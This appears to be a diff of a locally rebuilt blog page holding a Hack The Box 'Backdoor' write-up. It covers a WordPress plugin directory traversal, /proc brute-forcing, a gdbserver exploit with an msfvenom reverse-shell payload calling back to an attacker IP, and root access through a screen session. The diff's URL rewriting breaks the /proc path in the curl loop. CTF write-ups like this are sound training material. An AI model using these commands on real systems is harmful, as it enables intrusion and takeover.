@@ -1,6 +1,6 @@
 <!DOCTYPE html>
 <html lang="en">
-<head>
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
 
   <meta charset="utf-8" />
 
@@ -36,7 +36,7 @@
     <meta name="twitter:title" content="Backdoor Hackthebox writeup">
     <meta name="twitter:description" content="In this easy Linux box we are facing a wordpress plugin vulnerable to directory traversal letting us reading some files on the system , brute forcing the /proc/[pid] found a vulnerable gdb server running , exploiting it will gain low privilege shell , then abusing the screen binary to get the root access.
 ">
-    <meta name="twitter:image" content="/media/Backdoor/20220423032647.png">
+    <meta name="twitter:image" content="//localhost:1313/media/Backdoor/20220423032647.png">
   
 
   
@@ -44,8 +44,8 @@
   <meta property="og:title" content="Backdoor Hackthebox writeup">
   <meta property="og:description" content="In this easy Linux box we are facing a wordpress plugin vulnerable to directory traversal letting us reading some files on the system , brute forcing the /proc/[pid] found a vulnerable gdb server running , exploiting it will gain low privilege shell , then abusing the screen binary to get the root access.
 ">
-  <meta property="og:url" content="/post/backdoor/">
-  <meta property="og:image" content="/media/Backdoor/20220423032647.png">
+  <meta property="og:url" content="//localhost:1313/post/backdoor/">
+  <meta property="og:image" content="//localhost:1313/media/Backdoor/20220423032647.png">
 
 
 
@@ -53,7 +53,7 @@
 <meta name="generator" content="Hugo 0.86.1">
 
 
-<link rel="canonical" href="/post/backdoor/">
+<link rel="canonical" href="//localhost:1313/post/backdoor/">
 
 <meta name="renderer" content="webkit">
 <meta name="viewport" content="width=device-width,initial-scale=1">
@@ -78,20 +78,20 @@
 <meta name='msapplication-navbutton-color' content="#02b875">
 <meta name="msapplication-TileColor" content="#02b875">
 <meta name="msapplication-TileImage" content="/icons/icon-144x144.png">
-<link rel="icon" href="/favicon.ico">
-<link rel="icon" type="image/png" sizes="16x16" href="/icons/icon-16x16.png">
-<link rel="icon" type="image/png" sizes="32x32" href="/icons/icon-32x32.png">
-<link rel="icon" sizes="192x192" href="/icons/icon-192x192.png">
-<link rel="apple-touch-icon" href="/icons/icon-152x152.png">
-<link rel="manifest" href="/manifest.json">
+<link rel="icon" href="//localhost:1313/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="//localhost:1313/icons/icon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="//localhost:1313/icons/icon-32x32.png">
+<link rel="icon" sizes="192x192" href="//localhost:1313/icons/icon-192x192.png">
+<link rel="apple-touch-icon" href="//localhost:1313/icons/icon-152x152.png">
+<link rel="manifest" href="//localhost:1313/manifest.json">
 
 
-<link rel="preload" href="/styles/main-rendered.min.css" as="style">
+<link rel="preload" href="//localhost:1313/styles/main-rendered.min.css" as="style">
 
 
 <link rel="preload" href="https://fonts.googleapis.com/css?family=Lobster" as="style">
-<link rel="preload" href="/images/avatar.gif" as="image">
-<link rel="preload" href="/images/test.jpg" as="image">
+<link rel="preload" href="//localhost:1313/images/avatar.gif" as="image">
+<link rel="preload" href="//localhost:1313/images/test.jpg" as="image">
 
 
 <style>
@@ -99,7 +99,7 @@
     background: rgb(244, 243, 241) url('/images/test.jpg') repeat fixed;
   }
 </style>
-<link rel="stylesheet" href="/styles/main-rendered.min.css">
+<link rel="stylesheet" href="//localhost:1313/styles/main-rendered.min.css">
 
 
 <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lobster">
@@ -139,9 +139,9 @@
     
     
   <header class="site-header">
-  <a href=""><img class="avatar" src="/images/avatar.gif" alt="Avatar"></a>
+  <a href="//localhost:1313/"><img class="avatar" src="//localhost:1313/images/avatar.gif" alt="Avatar"></a>
   
-  <h2 class="title"><a href="">0xMesbaha</a></h2>
+  <h2 class="title"><a href="//localhost:1313/">0xMesbaha</a></h2>
   
   <p class="subtitle" style="color:#00ab6b">&gt; Hello Friend </p>
   <button class="menu-toggle" type="button" aria-label="Main Menu" aria-expanded="false" tab-index="0">
@@ -159,21 +159,21 @@
           
           
           ">
-          <a href="/">Posts</a>
+          <a href="//localhost:1313/">Posts</a>
         </li>
       
         <li class="menu-item
           
           
           ">
-          <a href="/tags/">Tags</a>
+          <a href="//localhost:1313/tags/">Tags</a>
         </li>
       
         <li class="menu-item
           
           
           ">
-          <a href="/about/">About</a>
+          <a href="//localhost:1313/about/">About</a>
         </li>
       
     </ul>
@@ -228,12 +228,12 @@ PORT     STATE SERVICE
 <ul>
 <li>so let&rsquo;s start with the port 80 , it is a simple web application</li>
 </ul>
-<p><img src="/media/Backdoor/20220423062021.png" alt="error"></p>
+<p><img src="//localhost:1313/media/Backdoor/20220423062021.png" alt="error"></p>
 <ul>
 <li>no parameters or any user interaction in the main pages.</li>
 <li>checking the source code we can see the <code>backdoor.htb</code> which we can add to the <code>/etc/hosts</code> and fuzzing Vhosts, But no results</li>
 </ul>
-<p><img src="/media/Backdoor/20220423062216.png" alt="error"></p>
+<p><img src="//localhost:1313/media/Backdoor/20220423062216.png" alt="error"></p>
 <ul>
 <li>directory Busting with <code>dirsearch</code> default wordlist</li>
 </ul>
@@ -258,27 +258,27 @@ PORT     STATE SERVICE
 <li>we can start enumerating possible users with <strong>wpscan</strong> or start fuzzing username and password but i spent alot of time at this rabbit hole with no lead.</li>
 <li>we can check the plugins from <code>/wp-content/plugins</code> path , we can know that from <a href="https://github.com/WordPress/WordPress/tree/master/">this</a> repository showing the default structure of a wordpress web application.</li>
 </ul>
-<p><img src="/media/Backdoor/20220423063249.png" alt="error"></p>
+<p><img src="//localhost:1313/media/Backdoor/20220423063249.png" alt="error"></p>
 <ul>
 <li>searching for it :</li>
 </ul>
-<p><img src="/media/Backdoor/20220423063357.png" alt="error"></p>
+<p><img src="//localhost:1313/media/Backdoor/20220423063357.png" alt="error"></p>
 <ul>
 <li>first result seems promising let&rsquo;s view it :</li>
 </ul>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">searchsploit -x 39575.txt
-</code></pre></div><p><img src="/media/Backdoor/20220423063508.png" alt="error"></p>
+</code></pre></div><p><img src="//localhost:1313/media/Backdoor/20220423063508.png" alt="error"></p>
 <ul>
 <li>trying the POC we have :</li>
 </ul>
-<p><img src="/media/Backdoor/20220423063751.png" alt="error"></p>
+<p><img src="//localhost:1313/media/Backdoor/20220423063751.png" alt="error"></p>
 <ul>
 <li>downloading the file , we can read it confirming the exploit is working</li>
 </ul>
-<p><img src="/media/Backdoor/20220423063824.png" alt="error"></p>
+<p><img src="//localhost:1313/media/Backdoor/20220423063824.png" alt="error"></p>
 <p>using :</p>
 <pre><code>http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../../../../../../etc/passwd
-</code></pre><p><img src="/media/Backdoor/20220423063953.png" alt="error"></p>
+</code></pre><p><img src="//localhost:1313/media/Backdoor/20220423063953.png" alt="error"></p>
 <ul>
 <li>we know their is a user <strong>user</strong> , now we can try reading other sensitive files on the system</li>
 <li>check <a href="https://zsahi.wordpress.com/2018/09/10/file-inclusion/">this</a> blog , talking about some interesting files to check whenever you have Directory Traversal / LFI</li>
@@ -292,7 +292,7 @@ PORT     STATE SERVICE
 i<span style="color:#f92672">=</span><span style="color:#ae81ff">2</span>
 <span style="color:#66d9ef">while</span>  <span style="color:#f92672">[</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">]</span>
 <span style="color:#66d9ef">do</span>
-curl  <span style="color:#e6db74">&#34;http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc/</span>$i<span style="color:#e6db74">/cmdline&#34;</span>  2&gt;/dev/null  &gt; response.txt
+curl  <span style="color:#e6db74">&#34;http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=//localhost:1313/proc/</span>$i<span style="color:#e6db74">/cmdline&#34;</span>  2&gt;/dev/null  &gt; response.txt
 <span style="color:#f92672">((</span>i++<span style="color:#f92672">))</span>
 tmp<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>cat response.txt 2&gt;/dev/null<span style="color:#66d9ef">)</span>
 <span style="color:#66d9ef">if</span> <span style="color:#f92672">[[</span> $tmp  <span style="color:#f92672">==</span> *<span style="color:#e6db74">&#34;1337&#34;</span>* <span style="color:#f92672">]]</span>
@@ -302,7 +302,7 @@ break
 <span style="color:#66d9ef">fi</span>
 echo   <span style="color:#e6db74">&#34;Process ID </span>$i<span style="color:#e6db74"> failed.&#34;</span>
 <span style="color:#66d9ef">done</span>
-</code></pre></div><p><img src="/media/Backdoor/20220423071608.png" alt="error"></p>
+</code></pre></div><p><img src="//localhost:1313/media/Backdoor/20220423071608.png" alt="error"></p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"> ~/CTFs/HTB/Backdoor$ cat response2.txt          
 /proc/814/cmdline/proc/814/cmdline/proc/814/cmdline/bin/sh-cwhile true;<span style="color:#66d9ef">do</span> su user -c <span style="color:#e6db74">&#34;cd /home/user;gdbserver --once 0.0.0.0:1337 /bin/true;&#34;</span>; <span style="color:#66d9ef">done</span>&lt;script&gt;window.close<span style="color:#f92672">()</span>&lt;/script&gt;%
 </code></pre></div><ul>
@@ -313,34 +313,34 @@ echo   <span style="color:#e6db74">&#34;Process ID </span>$i<span style="color:#
 <li>trying the steps mentioned in the exploit :</li>
 </ul>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msfvenom -p linux/x64/shell_reverse_tcp LHOST<span style="color:#f92672">=</span>10.10.16.3 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">4444</span> PrependFork<span style="color:#f92672">=</span>true -o rev.bin
-</code></pre></div><p><img src="/media/Backdoor/20220423072122.png" alt="error"></p>
+</code></pre></div><p><img src="//localhost:1313/media/Backdoor/20220423072122.png" alt="error"></p>
 <ul>
 <li>and we got a shell as user <strong>user</strong></li>
 </ul>
 <h1 id="privilege-escalation">Privilege escalation</h1>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">find / -perm -4000 2&gt;/dev/null
-</code></pre></div><p><img src="/media/Backdoor/20220423072343.png" alt="error"></p>
+</code></pre></div><p><img src="//localhost:1313/media/Backdoor/20220423072343.png" alt="error"></p>
 <ul>
 <li>screen binary with SUID doesn&rsquo;t have a clear path to gain root access, we can enumerate if the process is running with</li>
 </ul>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ps -ef --forest
-</code></pre></div><p><img src="/media/Backdoor/20220423072550.png" alt="error"></p>
+</code></pre></div><p><img src="//localhost:1313/media/Backdoor/20220423072550.png" alt="error"></p>
 <ul>
 <li>i have uploaded the <a href="https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64">pspy64</a> to understand the process more</li>
 </ul>
-<p><img src="/media/Backdoor/20220423072808.png" alt="error">
-<img src="/media/Backdoor/20220423073116.png" alt="error"></p>
+<p><img src="//localhost:1313/media/Backdoor/20220423072808.png" alt="error">
+<img src="//localhost:1313/media/Backdoor/20220423073116.png" alt="error"></p>
 <ul>
 <li>reading about abusing other user&rsquo;s screen session <a href="https://possiblelossofprecision.net/?p=1993">here</a>
-<img src="/media/Backdoor/20220423073257.png" alt="error"></li>
+<img src="//localhost:1313/media/Backdoor/20220423073257.png" alt="error"></li>
 <li>so we can attach to this root screen with :</li>
 </ul>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># screen -x [user]/screen</span>
 screen -x root/root
-</code></pre></div><p><img src="/media/Backdoor/20220423073352.png" alt="error"></p>
+</code></pre></div><p><img src="//localhost:1313/media/Backdoor/20220423073352.png" alt="error"></p>
 <h3 id="bonus-after-root">[BONUS] After root</h3>
 <p>running <code>crontab -e</code> to see how things were configured to work :</p>
-<p><img src="/media/Backdoor/20220423073455.png" alt="error"></p>
+<p><img src="//localhost:1313/media/Backdoor/20220423073455.png" alt="error"></p>
 <ul>
 <li>we can see the gdb server and the Screen binary cron jobs</li>
 </ul></article>
@@ -348,17 +348,17 @@ screen -x root/root
       
       <ul class="post-tags">
         
-          <li><a href="/tags/hackthebox"><span class="tag">Hackthebox</span></a></li>
+          <li><a href="//localhost:1313/tags/hackthebox"><span class="tag">Hackthebox</span></a></li>
         
-          <li><a href="/tags/wordpress"><span class="tag">Wordpress</span></a></li>
+          <li><a href="//localhost:1313/tags/wordpress"><span class="tag">Wordpress</span></a></li>
         
-          <li><a href="/tags/waste"><span class="tag">Waste</span></a></li>
+          <li><a href="//localhost:1313/tags/waste"><span class="tag">Waste</span></a></li>
         
-          <li><a href="/tags/directory-traversal"><span class="tag">Directory Traversal</span></a></li>
+          <li><a href="//localhost:1313/tags/directory-traversal"><span class="tag">Directory Traversal</span></a></li>
         
-          <li><a href="/tags/gdb-server"><span class="tag">Gdb Server</span></a></li>
+          <li><a href="//localhost:1313/tags/gdb-server"><span class="tag">Gdb Server</span></a></li>
         
-          <li><a href="/tags/screen"><span class="tag">Screen</span></a></li>
+          <li><a href="//localhost:1313/tags/screen"><span class="tag">Screen</span></a></li>
         
       </ul>
       
@@ -412,7 +412,7 @@ screen -x root/root
 
 
 
-<script src="/scripts/index.min.js"></script>
+<script src="//localhost:1313/scripts/index.min.js"></script>
 
 <script>
   if ('serviceWorker' in navigator) {
